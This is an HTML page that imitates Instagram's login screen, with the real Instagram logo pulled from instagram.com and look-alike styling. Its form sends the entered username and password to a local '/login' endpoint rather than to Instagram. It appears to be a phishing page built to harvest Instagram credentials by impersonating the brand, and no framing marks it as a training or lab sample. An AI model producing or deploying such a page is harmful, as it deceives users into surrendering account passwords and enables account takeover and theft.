<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; margin-bottom: 10px; }
        .logo { width: 175px; margin: 22px auto 12px; }
        input { width: 100%; padding: 10px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 7px; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; cursor: pointer; margin: 8px 0; font-size: 14px; }
        .divider { display: flex; align-items: center; margin: 10px 0 18px; }
        .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider span { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; cursor: pointer; display: block; margin-bottom: 10px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b572.png" class="logo">
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider"><div></div><span>OR</span><div></div></div>
        <a class="fb-login">Log in with Facebook</a>
        <a class="forgot">Forgot password?</a>
    </div>
</body>
</html>
